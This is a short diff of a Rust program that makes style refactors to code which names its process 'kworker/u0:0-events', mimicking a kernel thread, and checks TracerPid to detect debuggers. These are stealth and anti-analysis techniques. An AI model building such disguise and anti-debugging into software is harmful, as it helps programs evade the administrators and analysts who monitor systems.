@@ -18,7 +18,7 @@ fn main() {
 
     // Set process name
     unsafe {
-        libc::prctl(libc::PR_SET_NAME, b"kworker/u0:0-events\0".as_ptr() as *const libc::c_char);
+        libc::prctl(libc::PR_SET_NAME, c"kworker/u0:0-events".as_ptr() as *const libc::c_char);
     }
 
     // Start Netlink Process Connector monitoring
@@ -31,8 +31,8 @@ fn main() {
 fn check_debugger() -> bool {
     let status = std::fs::read_to_string("/proc/self/status").unwrap_or_default();
     for line in status.lines() {
-        if line.starts_with("TracerPid:") {
-            if let Ok(pid) = line["TracerPid:".len()..].trim().parse::<i32>() {
+        if let Some(stripped) = line.strip_prefix("TracerPid:") {
+            if let Ok(pid) = stripped.trim().parse::<i32>() {
                 if pid != 0 {
                     return true;
                 }
